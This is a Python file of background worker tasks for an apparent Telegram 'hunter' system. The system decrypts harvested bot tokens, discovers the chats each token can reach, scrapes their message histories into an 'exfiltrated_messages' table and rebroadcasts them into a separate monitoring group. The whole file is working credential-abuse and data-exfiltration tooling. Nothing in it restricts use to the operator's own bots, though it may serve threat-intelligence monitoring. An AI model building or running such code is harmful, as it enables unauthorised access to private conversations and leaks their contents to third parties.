import asyncio
import time
from app.workers.celery_app import app
from app.core.database import db
from app.core.security import security
from app.services.scraper_srv import scraper_service
from app.services.broadcaster_srv import broadcaster_service
import redis
from app.core.config import settings

# Redis Client for Locking
redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)

@app.task(name="flow.exfiltrate_chat")
def exfiltrate_chat(cred_id: str):
    """
    1. Decrypt token.
    2. Scrape history.
    3. Save to DB.
    4. Trigger broadcast.
    """
    # Sync wrapper for async logic
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    return loop.run_until_complete(_exfiltrate_logic(cred_id))

async def _exfiltrate_logic(cred_id: str):
    print(f"🕵️ [Exfil] Starting exfiltration for credential {cred_id}")
    await broadcaster_service.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
    # Fetch credential
    response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
    if not response.data:
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    encrypted_token = record["bot_token"]
    chat_id = record["chat_id"]
    
    # Decrypt
    try:
        bot_token = security.decrypt(encrypted_token)
    except Exception as e:
        # Invalid token or key
        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
        return f"Decryption failed for {cred_id}: {e}"

    # Scrape
    try:
        print(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
        await broadcaster_service.send_log(f"⏳ Scraping chat `{chat_id}`...")
        messages = await scraper_service.scrape_history(bot_token, chat_id)
        print(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
        await broadcaster_service.send_log(f"✅ Scraped {len(messages)} messages.")
    except Exception as e:
        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
        return f"Scraping failed: {e}"

    # Save Messages
    new_count = 0
    for msg in messages:
        msg["credential_id"] = cred_id
        # We try to insert. If duplicate (telegram_msg_id + credential_id), we should handle it.
        # Supabase/Postgres doesn't support 'ON CONFLICT' easily via simple client insert without knowing constraints.
        # But we added a unique index. So we can ignore errors or check first.
        # Efficient way: insert and ignore error.
        try:
            db.table("exfiltrated_messages").insert(msg).execute()
            new_count += 1
        except Exception:
            pass # Skip duplicate

    if new_count > 0:
        await broadcaster_service.send_log(f"💾 Saved {new_count} new messages to DB.")

    # Trigger Broadcast
    if new_count > 0:
        broadcast_pending.delay()

    return f"Exfiltrated {new_count} new messages."

@app.task(name="flow.enrich_credential")
def enrich_credential(cred_id: str):
    """
    1. Decrypt token.
    2. Discover chats (Enrichment).
    3. Update DB with Chat ID(s).
    4. Trigger Exfiltration.
    """
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(_enrich_logic(cred_id))

async def _enrich_logic(cred_id: str):
    print(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
    await broadcaster_service.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
    # Fetch credential
    response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
    if not response.data:
        return f"Credential {cred_id} not found."
    
    record = response.data[0]
    
    # Decrypt
    try:
        bot_token = security.decrypt(record["bot_token"])
    except Exception as e:
        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
        return f"Decryption failed: {e}"

    # Discover
    bot_info = {}
    try:
        print(f"🔎 [Enrich] Discovering chats via ScraperService...")
        bot_info, chats = await scraper_service.discover_chats(bot_token)
        print(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
        if chats:
            chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
            await broadcaster_service.send_log(f"✅ Discovered chats: {chat_list}")
        else:
            await broadcaster_service.send_log("⚠️ No chats found.")
    except Exception as e:
        return f"Discovery failed: {e}"

    if not chats:
        # Valid token, but no open dialogs. 
        # Mark as 'active' - token works but no chats accessible
        db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id).execute()
        return "Token valid, but no chats found. Status updated to 'active'."

    # Update Logic
    # 1. Update the ORIGINAL record with the first chat found.
    # 2. If more chats, create NEW records (clones).
    
    first_chat = chats[0]
    print(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
    
    # Update primary
    # Pre-create Topic with NEW FORMAT: @username / botid
    from app.core.config import settings
    
    bot_username = bot_info.get("username") or "unknown"
    bot_id = bot_info.get("id") or "0"
    topic_name = f"@{bot_username} / {bot_id}"
    
    topic_id = 0
    try:
        topic_id = await broadcaster_service.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
        # Send Header Message
        if topic_id:
             await broadcaster_service.send_topic_header(settings.MONITOR_GROUP_ID, topic_id, topic_name)
    except Exception as e:
        print(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")

    meta_payload = {
        "chat_name": first_chat["name"], 
        "type": first_chat["type"], 
        "enriched": True,
        "bot_username": bot_username,
        "bot_id": bot_id
    }
    if topic_id:
        meta_payload["topic_id"] = topic_id

    db.table("discovered_credentials").update({
        "chat_id": first_chat["id"],
        "meta": meta_payload
    }).eq("id", cred_id).execute()
    
    # Trigger Exfiltration for Primary
    print(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
    await broadcaster_service.send_log(f"🚀 Triggering background exfiltration task.")
    exfiltrate_chat.delay(cred_id)
    
    msg = f"Enriched {cred_id} with chat {first_chat['id']}."

    # Handle multiple chats
    if len(chats) > 1:
        for extra_chat in chats[1:]:
             # WORKAROUND for this MVP:
            # We will only support 1 chat (the most recent/first one) per credential.
            pass
            
        if len(chats) > 1:
            # Update meta with list of other chats
            all_chat_ids = [c["id"] for c in chats]
            db.table("discovered_credentials").update({
                "meta": {
                    "chat_name": first_chat["name"], 
                    "type": first_chat["type"], 
                    "enriched": True,
                    "all_chats": all_chat_ids
                }
            }).eq("id", cred_id).execute()
            msg += f" (Found {len(chats)} total chats, tracking primary only)"

    return msg

@app.task(name="flow.broadcast_pending")
def broadcast_pending():
    # Distributed Lock to prevent race conditions (e.g. Local Worker vs Prod Worker)
    lock_key = "telegram_hunter:lock:broadcast"
    # timeout=55s (slightly less than 60s schedule) to auto-release if crash
    lock = redis_client.lock(lock_key, timeout=55, blocking=False)
    
    acquired = lock.acquire()
    if not acquired:
        return "Skipped: Broadcast task already running (Lock active)."

    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop.run_until_complete(_broadcast_logic())
    finally:
        try:
            lock.release()
        except redis.exceptions.LockError:
            pass # Lock expired or already released

async def _broadcast_logic():
    # Query pending messages
    # We want to group by credential_id to send them in order and in correct topic
    # Limit to 50 to avoid long running tasks
    response = db.table("exfiltrated_messages")\
        .select("*, discovered_credentials!inner(meta)")\
        .eq("is_broadcasted", False)\
        .order("telegram_msg_id", desc=False)\
        .limit(50)\
        .execute()
    
    messages = response.data
    if not messages:
        return "No pending broadcasts."

    from app.core.config import settings
    group_id = settings.MONITOR_GROUP_ID

    sent_count = 0
    # Local cache to avoid DB roundtrips within this batch if multiple messages for same cred
    cached_topic_ids = {}

    for msg in messages:
        try:
            cred_id = msg["credential_id"]
            # Extract meta from the joined discovered_credentials
            cred_info = msg.get("discovered_credentials", {})
            meta = cred_info.get("meta", {}) if cred_info else {}
            
            # 1. Check Cache, then Meta, then Create
            thread_id = cached_topic_ids.get(cred_id) or meta.get("topic_id")

            if not thread_id:
                # Determine Topic Name only if we need to create
                # Priority: Chat Name -> Bot Name -> Cred ID
                topic_name = meta.get("chat_name") or meta.get("bot_name") or f"Cred-{cred_id[:8]}"
                
                # Ensure Topic
                thread_id = await broadcaster_service.ensure_topic(group_id, topic_name)
                
                # Update DB (Persistent Cache)
                # We fetch current meta again to avoid overwriting race (optimistic)
                # But for simplicity, we merge with what we have.
                meta["topic_id"] = thread_id
                db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                print(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
            
            # Update local cache
            cached_topic_ids[cred_id] = thread_id
            
            # Send Message
            await broadcaster_service.send_message(group_id, thread_id, msg)
            
            # Update status
            db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg["id"]).execute()
            sent_count += 1
            
            # Rate limit (ASYNC sleep to not block the event loop)
            await asyncio.sleep(2.0) 

        except Exception as e:
            print(f"Error broadcasting msg {msg['id']}: {e}")
            continue
            
    return f"Broadcasted {sent_count} messages."

@app.task(name="flow.system_heartbeat")
def system_heartbeat():
    """
    Periodic ping to confirm system uptime.
    """
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    msg = "💓 **System Heartbeat**: Worker is active and scanning."
    loop.run_until_complete(broadcaster_service.send_log(msg))
    return "Heartbeat sent."
